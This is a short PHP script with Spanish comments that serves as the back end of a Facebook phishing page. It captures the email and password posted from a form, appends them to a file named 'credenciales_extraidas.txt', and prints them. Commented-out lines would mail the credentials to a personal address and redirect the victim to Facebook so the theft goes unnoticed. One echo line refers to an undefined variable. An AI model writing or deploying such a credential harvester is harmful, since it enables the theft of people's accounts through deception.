<?php
$usuario = $_POST["email"];
$palabra_secreta = $_POST["pass"];

#Capturar las credenciales
$file = fopen("credenciales_extraidas.txt", "a");
fwrite($file, "Username: " . $usuario . PHP_EOL);
fwrite($file, "Password: " . $palabra_secreta . PHP_EOL);
fclose($file);
#mail("xavierventeo@gmail.com", "asunto", "cuerpo");
echo "<p>El username es: " . $usuario . "</p>";
echo "<p>El password es: " . $contrasena . "</p>";
#Si queremos reenviar a Facebook, comentar las lineas previsas de echo y descomentar header("Location....
#header("Location: https://www.facebook.com/");
?>
